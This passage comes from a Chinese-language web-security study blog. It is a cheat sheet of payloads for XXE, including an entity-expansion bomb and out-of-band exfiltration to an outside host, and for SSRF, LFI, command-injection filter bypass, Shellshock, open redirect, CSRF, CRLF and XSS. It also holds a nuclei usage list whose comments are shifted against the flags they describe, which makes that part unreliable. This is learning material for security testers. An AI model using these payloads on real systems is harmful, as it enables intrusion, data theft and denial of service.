&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>远程攻击 - 通过外部 xml 包含</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;https://example.com/entity1.xml&quot;&gt;]&gt;</span><br><span class="line">&lt;lolz&gt;&lt;lol&gt;3..2..1...&amp;test&lt;lol&gt;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>UTF-7</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?&gt;</span><br><span class="line">+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4</span><br><span class="line">+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+</span><br><span class="line">+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://publicServer.com/parameterEntity_sendftp.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br><span class="line"></span><br><span class="line">File stored on http://publicServer.com/parameterEntity_sendftp.dtd</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;ftp://publicServer.com/%payload;&#x27;&gt;&quot;&gt;</span><br><span class="line">%param1;</span><br></pre></td></tr></table></figure><h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://0177.1/</span><br><span class="line"></span><br><span class="line">http://127.000.000.1</span><br><span class="line"></span><br><span class="line">http://0x7f.1/</span><br></pre></td></tr></table></figure><p>如果是其他什么地址，可以用<code>http://www.subnetmask.info/</code> 计算</p><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gopher://, </span><br><span class="line">dict://, </span><br><span class="line">php://, </span><br><span class="line">jar://, </span><br><span class="line">tftp://</span><br></pre></td></tr></table></figure><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>xip.io是一个提供通配符DNS解析的服务，它将域名中的IP地址部分解析为实际的IP地址</p><p>nip.io也是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.1.xip.io</span><br><span class="line">www.10.0.0.1.xip.io</span><br><span class="line">mysite.10.0.0.1.xip.io</span><br><span class="line">foo.bar.10.0.0.1.xip.io</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.1.nip.io</span><br><span class="line">app.10.0.0.1.nip.io</span><br><span class="line">customer1.app.10.0.0.1.nip.io</span><br><span class="line">customer2.app.10.0.0.1.nip.io</span><br><span class="line">otherapp.10.0.0.1.nip.io</span><br></pre></td></tr></table></figure><h3 id="AWS-EC2-元数据（一种信息泄露"><a href="#AWS-EC2-元数据（一种信息泄露" class="headerlink" title="AWS EC2 元数据（一种信息泄露"></a>AWS EC2 元数据（一种信息泄露</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x/latest/meta-data/</span><br><span class="line">http://x.x.x.x/latest/user-data/local-hostname</span><br><span class="line">http://x.x.x.x/latest/user-data/public-hostname</span><br></pre></td></tr></table></figure><h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">../\</span><br><span class="line"></span><br><span class="line">..\/</span><br><span class="line"></span><br><span class="line">/..</span><br><span class="line"></span><br><span class="line">\/..</span><br><span class="line"></span><br><span class="line">/%5c..</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><p>Werkzeug 调试器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">strіng</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">i&#x27;&#x27;&#x27;d</span><br><span class="line">i&quot;&quot;&quot;d</span><br><span class="line"></span><br><span class="line">\l\s -l\a\h</span><br><span class="line"></span><br><span class="line">cat /e?c/p?ss??</span><br><span class="line">cat /e??/??ss*</span><br><span class="line"></span><br><span class="line">&#123;ls,&#125;</span><br><span class="line">&#123;ls,-a&#125;</span><br><span class="line"></span><br><span class="line">壳震漏洞</span><br><span class="line">() &#123; :;&#125;; echo vulnerable</span><br><span class="line">curl -H &quot;User-Agent: () &#123; :; &#125;; /bin/eject&quot; http://example.com/</span><br></pre></td></tr></table></figure><h3 id="打开重定向"><a href="#打开重定向" class="headerlink" title="打开重定向"></a>打开重定向</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/%09/google.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/%5cgoogle.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//www.google.com/%2f%2e%2e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//www.google.com/%2e%2e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//google.com/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//google.com/%2f..</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//\google.com</span><br><span class="line"></span><br><span class="line">/\victim.com:80%40google.com</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">?url=http://&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?url=https://&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?next=http://&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?next=https://&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?url=https://&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?url=http://&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?url=//&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?url=$2f%2f&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?next=//&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?next=$2f%2f&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?url=//&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?url=$2f%2f&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?url=//&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/redirect/&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/cgi-bin/redirect.cgi?&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/out/&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/out?&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/out?/&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/out?//&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/out?/\&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/out?///&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?view=&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?view=/&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?view=//&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?view=/\&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?view=///&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/login?to=&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/login?to=/&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/login?to=//&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/login?to=/\&#123;target&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/login?to=///&#123;target&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="nuclei-使用"><a href="#nuclei-使用" class="headerlink" title="nuclei 使用"></a>nuclei 使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 显示帮助信息</span><br><span class="line">nuclei -h</span><br><span class="line"></span><br><span class="line"># 显示 Nuclei 的当前版本</span><br><span class="line">nuclei -version</span><br><span class="line"></span><br><span class="line"># 从文件中加载目标列表</span><br><span class="line">nuclei -l targets.txt -t ~/nuclei-templates/</span><br><span class="line"></span><br><span class="line"># 指定单个目标进行测试</span><br><span class="line">nuclei -t https://example.com -t ~/nuclei-templates/</span><br><span class="line"></span><br><span class="line"># 以静默模式运行 Nuclei（抑制输出）</span><br><span class="line">nuclei -u https://example.com -t ~/nuclei-templates/</span><br><span class="line"></span><br><span class="line"># 指定使用的并发线程数</span><br><span class="line">nuclei -silent -t https://example.com -t ~/nuclei-templates/</span><br><span class="line"></span><br><span class="line"># 跳过需要身份验证的模板</span><br><span class="line">nuclei -c 10 -t https://example.com -t ~/nuclei-templates/</span><br><span class="line"></span><br><span class="line"># 自定义 Nuclei 报告的输出格式</span><br><span class="line">nuclei -no-verify -t https://example.com -t ~/nuclei-templates/</span><br><span class="line"></span><br><span class="line"># 忽略 SSL 证书错误</span><br><span class="line">nuclei -o output.txt -t https://example.com -t ~/nuclei-templates/</span><br><span class="line"></span><br><span class="line"># 指定自定义 HTTP 头包含在请求中</span><br><span class="line">nuclei -insecure -t https://example.com -t ~/nuclei-templates/</span><br><span class="line"></span><br><span class="line"># 指定自定义用户代理字符串包含在请求中</span><br><span class="line">nuclei -headers &quot;Authorization: Bearer TOKEN&quot; -t https://example.com -t ~/nuclei-templates/</span><br><span class="line"></span><br><span class="line">nuclei -user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&quot; -t https://example.com -t ~/nuclei-templates/</span><br></pre></td></tr></table></figure><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>额，应该叫开放式重定向</p><p>怎么说呢，就是让页面跳转到攻击的页面，比方说</p><figure class="highlight plaintext"><figcaption><span>as</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://vulnerable-website.com/redirect?url=https://malicious-website.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://vulnerable-website.com/profile?redirect_uri=https://malicious-website.com</span><br></pre></td></tr></table></figure><p>这就是重定向</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">?redirect_url= </span><br><span class="line"></span><br><span class="line"> ?next= </span><br><span class="line"></span><br><span class="line"> ?continue= </span><br><span class="line"></span><br><span class="line"> ?goto= </span><br><span class="line"></span><br><span class="line"> ?return_Url= </span><br><span class="line"></span><br><span class="line"> ?destination= </span><br><span class="line"></span><br><span class="line"> ?fromURI= </span><br><span class="line"></span><br><span class="line"> ?redirect= </span><br><span class="line"></span><br><span class="line"> ?go= </span><br><span class="line"></span><br><span class="line"> ?from= </span><br><span class="line"></span><br><span class="line"> ?return= </span><br><span class="line"></span><br><span class="line"> ?rurl= </span><br><span class="line"></span><br><span class="line"> ?checkout_url= </span><br></pre></td></tr></table></figure><p><a href="https://cloud.tencent.com/developer/article/1516344">开放式重定向</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">redirect</span><br><span class="line"></span><br><span class="line">redirect_to</span><br><span class="line"></span><br><span class="line">redirect_url</span><br><span class="line"></span><br><span class="line">redirectUrl</span><br><span class="line"></span><br><span class="line">callback</span><br><span class="line"></span><br><span class="line">toUrl</span><br><span class="line"></span><br><span class="line">fromUrl</span><br><span class="line"></span><br><span class="line">request</span><br><span class="line"></span><br><span class="line">oauth_callback</span><br><span class="line"></span><br><span class="line">url</span><br><span class="line"></span><br><span class="line">go</span><br><span class="line"></span><br><span class="line">jump</span><br><span class="line"></span><br><span class="line">jump_to</span><br><span class="line"></span><br><span class="line">target</span><br><span class="line"></span><br><span class="line">service</span><br><span class="line"></span><br><span class="line">to</span><br><span class="line"></span><br><span class="line">returnUrl</span><br><span class="line"></span><br><span class="line">goTo</span><br><span class="line"></span><br><span class="line">link</span><br><span class="line"></span><br><span class="line">linkto</span><br><span class="line"></span><br><span class="line">domain</span><br><span class="line"></span><br><span class="line">return</span><br><span class="line"></span><br><span class="line">locationUrl</span><br><span class="line"></span><br><span class="line">r_url</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果是黑盒可以考虑<a href="https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt">open-redirect</a></p><p>白盒的话可以参考<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.sendRedirect(request.getParameter(<span class="string">&quot;url&quot;</span>));</span><br></pre></td></tr></table></figure><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$redirect_url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$redirect_url</span>);</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string url = request.QueryString[&quot;url&quot;];</span><br><span class="line">Response.Redirect(url);</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect_to params[:url]</span><br></pre></td></tr></table></figure><br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">redirect_url = request.GET.get(&quot;url&quot;)HttpResponseRedirect(redirect_url)</span></span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect\_url = request.form\[&#x27;url&#x27;\] redirect(redirect\_url)</span><br></pre></td></tr></table></figure></p><p>绕过方法的话请参考这篇<a href="https://www.cnblogs.com/gorillalee/p/14351069.html">URL重定向漏洞解析</a>,师傅写的很详细了</p><h2 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h2><p>有点像，木偶戏？简单来说就是你在一个已经进行过身份认证的人的浏览器（也不只是有浏览器），执行某些攻击者不必要的操作</p><h3 id="csrf攻击类型"><a href="#csrf攻击类型" class="headerlink" title="csrf攻击类型"></a>csrf攻击类型</h3><ol><li><p>基于GET请求的CSRF攻击</p><p> 恶意请求通过GET类型发送，通常是镶嵌在连接或者图片链接中</p></li><li><p>基于POST请求的CSRF攻击</p><p> 恶意请求通过POST类型发送，通常是镶嵌在表单或者js代码中</p></li></ol><p>一个POST的攻击载荷<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;https://vulnerable-website.com/transfer?amount=1000&amp;recipient=attacker&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;</span><br><span class="line">&lt;form action=&quot;https://vulnerable-website.com/change-email&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;attacker@email.com&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Click me!&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>Cookie 只是一个保存在本地浏览器中的 4KB 文件，用于存储用户独有的信息，如偏好设置、会话 ID 和购物车中的商品，然后服务器会检索这些信息.</p></blockquote><h2 id="cors跨源资源共享"><a href="#cors跨源资源共享" class="headerlink" title="cors跨源资源共享"></a>cors跨源资源共享</h2><p>CORS:全称跨域资源共享（Cross-Origin Resource Sharing）</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>cors可分为两类：简单请求和非简单请求</p><p>简单请求：请求方法是<code>GET、HEAD、POST</code>中的一种，且HTTP头信息不超出以下几种字段：<code>Accept、Accept-Language、Content-Language、Last-Event-ID、Content-Type</code></p><p>非简单请求：请求方法是<code>PUT、DELETE、CONNECT、OPTIONS、TRACE、PATCH，或者Content-Type字段</code>的值不是<code>application/x-www-form-urlencoded、multipart/form-data、text/plain</code> </p><p>当浏览器发现服务器的请求为简单请求时，会在头信息里加入Origin字段。Origin字段代表此次请求来自哪个域，服务器就可以检验是否来自该域。如果匹配，服务器就会在响应里增添三个字段：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin</span><br><span class="line">Access-Control-Allow-Credentials</span><br><span class="line">Access-Control-Expose-Headers</span><br></pre></td></tr></table></figure><br>其中 <code>Access-Control-Allow-Origin</code>是必须有的，<code>Access-Control-Allow-Origin</code>字段代表允许哪个域访问。当字段值为<code>*</code>时，就代表任意域都可以访问，这样，就导致了Cors漏洞的产生</p><p><a href="https://pic1.imgdb.cn/item/677f1ecad0e0a243d4f24e76.png"><img src="https://pic1.imgdb.cn/item/677f1ecad0e0a243d4f24e76.png" alt="item.filename"></a></p><p>上面是我访问bili的,他明确规定了<code>Access-Control-Allow-Origin</code>为<code>https://www.bilibili.com</code></p><h2 id="crlf"><a href="#crlf" class="headerlink" title="crlf"></a>crlf</h2><p>CRLF注入是一种利用应用程序中的CRLF（回车换行）字符来执行恶意操作的攻击。</p><p>CRLF实际上是由CR和LF两个字符拼接而成，他们分别表示<code>回车(&quot;\r&quot;)</code>/<code>换行(&quot;\n&quot;)</code>,十六进制表示为<code>0x0d</code>和<code>0x0a</code><br>ASCII表示为<code>13/10</code></p><p>像是这样，我的想法是注入一下<code>Set-Cookie:crlf=true</code>,所以我在里面<code>%0d%0aSet-Cookie:crlf=true</code>，这样如果成了的话就可以在响应头里看到<code>Set-Cookie:crlf=true</code></p><p><img src="https://pic1.imgdb.cn/item/67809dd0d0e0a243d4f2ec14.png" alt=""></p><p>但是这个并没有成功，o(╥﹏╥)o</p><p>这玩意看着没什么危害，但是试想一下，如果我在后面添一个xss，像是这样<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;0</span><br></pre></td></tr></table></figure></p><p>这样的话，如果有人访问这个页面，就会弹出xss</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">🔹 /%%0a0aSet-Cooke:crlf</span><br><span class="line">🔹 /%0aSet-Cooke:crlf</span><br><span class="line">🔹 /%0d%0aSet-Cooke:crlf</span><br><span class="line">🔹 /%0dSet-Cooke:crlf</span><br><span class="line">🔹 /%23%0aSet-Cooke:crlf</span><br><span class="line">🔹 /%23%0d%0aSet-Cooke:crlf</span><br><span class="line">🔹 /%23%0dSet-Cooke:crlf</span><br><span class="line">🔹 /%25%30%61Set-Cooke:crlf</span><br><span class="line">🔹 /%25%30aSet-Cooke:crlf</span><br><span class="line">🔹 /%250aSet-Cooke:crlf</span><br><span class="line">🔹 /%25250aSet-Cooke:crlf</span><br><span class="line">🔹 /%2e%2e%2f%0d%0aSet-Cooke:crlf</span><br><span class="line">🔹 /%2f%2e%2e%0d%0aSet-Cooke:crlf</span><br><span class="line">🔹 /%2F%0d%0aSet-Cooke:crlf</span><br><span class="line">🔹 /%3f%0d%0aSet-Cooke:crlf</span><br><span class="line">🔹 /%3f%0dSet-Cooke:crlf</span><br><span class="line">🔹 /%u000aSet-Cooke:crlf</span><br><span class="line">🔹 /%E5%98%8D%E5%98%8ASet-Cooke:crlf</span><br></pre></td></tr></table></figure><h2 id="xss-1"><a href="#xss-1" class="headerlink" title="xss"></a>xss</h2><p>三种XSS 